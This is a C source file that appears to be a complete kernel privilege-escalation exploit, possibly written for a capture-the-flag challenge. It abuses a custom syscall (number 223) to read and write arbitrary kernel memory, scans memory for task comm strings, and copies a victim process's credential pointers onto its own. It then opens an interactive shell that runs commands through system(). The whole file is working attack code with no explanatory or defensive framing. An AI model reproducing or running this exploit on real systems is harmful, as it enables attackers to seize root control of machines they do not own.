#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// #include <sys/dir.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __arm__
    // #include <dirent.h>
    #include <sys/prctl.h>
#endif

#define syscall_num 223
#define MAX_BUFF_SIZE (1024 * 1024 * 15)
#define PROCESS_NAME "PURPLE_CASTLE"
#define START_KERNEL_ADDR (0x80000000)
#define SCAN_MEM_OFFSET (0x5500000)
#define SCAN_ADDR_START (START_KERNEL_ADDR + SCAN_MEM_OFFSET)
#define MAX_KERNEL_ADDR (0x869e0000)
#define MINIMUM_CRED_PTR START_KERNEL_ADDR

typedef uint8_t u8;

void shell();

void sys_upper(void* src, void* dst) {
    syscall(syscall_num, src, dst);
}

void kernel_write_byte(u8 c, size_t dst) {
    char buff[2] = {c, 0};
    if (c == 0 || (c >= 0x60 && c <= 0x7b)) {
        printf("<WARNING> Writing to kernel may fail : %c\n", c);
        fflush(stdout);
    }

    sys_upper(buff, (void*)dst);
}

void kernel_write_bytes(u8* src, size_t dst, size_t count) {
    size_t i = 0;
    for (i = 0; i < count; i++) {
        kernel_write_byte(src[i], dst + i);
    }
}

// return a pointer to a buffer that contains the data of
// no-less than len size
void* read_kernel_memory(size_t addr, size_t len, void* buff) {
    if (buff == NULL) {
        buff = calloc(MAX_BUFF_SIZE, 1);
    } else {
        memset(buff, 0, MAX_BUFF_SIZE);
    }
    size_t read = 0;
    size_t read_now = 0;
    if (buff == NULL) {
        printf("Unable to allocate memory read_kernel_memory\n");
        fflush(stdout);
        return NULL;
    }

    while (read < len) {
        sys_upper((void*)(addr + read), buff + read);
        read_now = strlen(buff + read);
        if (read_now == 0) {
            read++;
        } else {
            read += read_now;
        }
    }
    return buff;
}

size_t scan_kernel_memory_for_string(
    size_t starting_addr,
    size_t max_addr,
    char* str
) {
    size_t size = max_addr - starting_addr;
    printf(
        "Searching for %s in %zx - %zx, size=%zx\n",
        str,
        starting_addr,
        max_addr,
        size
    );
    fflush(stdout);
    size_t chunk = MAX_BUFF_SIZE / 100;
    char* buff = (char*)calloc(100, 1);
    if (buff == NULL) {
        printf("Unable to allocate memory scan_kernel_memory_for_string\n");
        fflush(stdout);
        return 0;
    }
    size_t c = 0;
    size_t i = 0;
    size_t bytes_read = 0;
    char* raw_bytes = NULL;
    for (bytes_read = 0; bytes_read < size; bytes_read += chunk) {
        raw_bytes =
            read_kernel_memory(starting_addr + bytes_read, chunk, raw_bytes);
        if (raw_bytes == NULL) {
            printf("got null buff\n");
            fflush(stdout);
            return 0;
        }
        for (i = 0; i < chunk; i++) {
            char b = raw_bytes[i];
            if (c > 50) {
                c = 0;
            }
            if (b >= 0x20 && b <= 0x7e) {
                buff[c++] = b;
            } else if (c != 0) {
                buff[c] = '\0';
                if (strcmp(buff, str) == 0) {
                    free(raw_bytes);
                    free(buff);
                    return starting_addr + i + bytes_read - c;
                }
                c = 0;
            }
        }
    }
    free(buff);
    free(raw_bytes);
    return 0;
}

// Get address of string in kernel memory, return true if liekly to be comm of process.
bool is_proc_comm(size_t addr, size_t* o_real_cred_addr, size_t* o_cred_addr) {
    printf("Ich komme? %zx\n", addr);
    fflush(stdout);
    void* mem = read_kernel_memory(addr - 8, 8, NULL);
    if (mem == NULL) {
        printf("Got null memory\n");
        fflush(stdout);
        return false;
    }
    uint32_t* real_cred_ptr = mem;
    uint32_t* cred_ptr = mem + 4;
    printf(
        "Possible task_sturct of - at %p, real_cred=%x, cred=%x\n",
        // (char*)mem + 8,
        (void*)addr,
        *real_cred_ptr,
        *cred_ptr
    );
    fflush(stdout);
    if (*real_cred_ptr > MINIMUM_CRED_PTR && *cred_ptr > MINIMUM_CRED_PTR
        && *real_cred_ptr == *cred_ptr) {
        printf("Ja!\n");
        fflush(stdout);
        *o_real_cred_addr = *real_cred_ptr;
        *o_cred_addr = *real_cred_ptr;
        free(mem);
        return true;
    }
    free(mem);
    return false;
}

size_t
find_proc_comm_addr(char* comm, size_t* o_real_cred_addr, size_t* o_cred_addr) {
    size_t addr = SCAN_ADDR_START;

    while (1) {
        addr = scan_kernel_memory_for_string(addr + 1, MAX_KERNEL_ADDR, comm);

        if (addr == 0) {
            return 0;
        }

        // Found possible match
        if (is_proc_comm(addr, o_real_cred_addr, o_cred_addr)) {
            return addr;
        }
    }

    return 0;
}

int main(int argc, char** argv) {
    prctl(15, PROCESS_NAME, 0, 0, 0);

    size_t this_real_cred = 0;
    size_t this_cred = 0;
    size_t victim_real_cred = 0;
    size_t victim_cred = 0;

    size_t this_comm_addr =
        find_proc_comm_addr(PROCESS_NAME, &this_real_cred, &this_cred);
    printf(
        "our comm is at %zx, cred ptrs: %zx,%zx\n",
        this_comm_addr,
        this_real_cred,
        this_cred
    );
    size_t victim_comm_addr =
        find_proc_comm_addr("LINUXRC", &victim_real_cred, &victim_cred);
    fflush(stdout);

    printf(
        "victim comm is at %zx, cred ptrs: %zx,%zx\n",
        victim_comm_addr,
        victim_real_cred,
        victim_cred
    );
    fflush(stdout);

    size_t this_real_cred_addr = this_comm_addr - 8;
    size_t this_cred_addr = this_comm_addr - 4;
    size_t victim_real_cred_addr = victim_comm_addr - 8;
    size_t victim_cred_addr = victim_comm_addr - 4;

    printf("Do you want to continue? [Y/n] ");
    char c[3];
    read(0, &c, 3);

    if (c[0] == 'y' || c[0] == 'Y') {
        kernel_write_bytes((u8*)&victim_cred, this_cred_addr, 4);
        kernel_write_bytes((u8*)&victim_real_cred, this_real_cred_addr, 4);
    }

    system("ps -e");

    printf("pid: %d\n", getpid());
    printf("uid: %d\n", getuid());

    shell();
}

void shell() {
    char command[100] = {0};
    int r = 0;
    while (1) {
        printf("$ ");
        fflush(stdout);
        r = read(0, command, 99);
        command[r] = '\0';
        if (strncmp(command, "Stop", 4) == 0)
            break;
        system(command);
    }
}
